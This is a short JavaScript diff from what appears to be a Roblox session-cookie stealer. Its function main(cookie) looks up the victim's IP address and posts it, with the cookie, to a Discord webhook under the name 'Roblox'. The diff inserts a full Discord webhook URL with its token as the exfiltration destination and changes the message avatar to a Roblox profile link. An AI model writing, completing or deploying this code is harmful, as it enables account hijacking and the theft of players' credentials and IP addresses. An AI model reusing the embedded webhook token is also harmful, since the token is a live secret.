@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://discord.com/api/webhooks/1062345861218185216/dH2oqYdA8FyKZKS2cO6kB9QgMzOlwD_LxHll1I1BtjJHIkAe_jmNS92uXkoDGe-L1HRN";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
@@ -54,7 +54,7 @@ async function main(cookie) {
               }
             ],
             "username": "Roblox",
-            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
+            "avatar_url": "https://www.roblox.com/users/1123608764/profile",
             "attachments": []
         })
     });
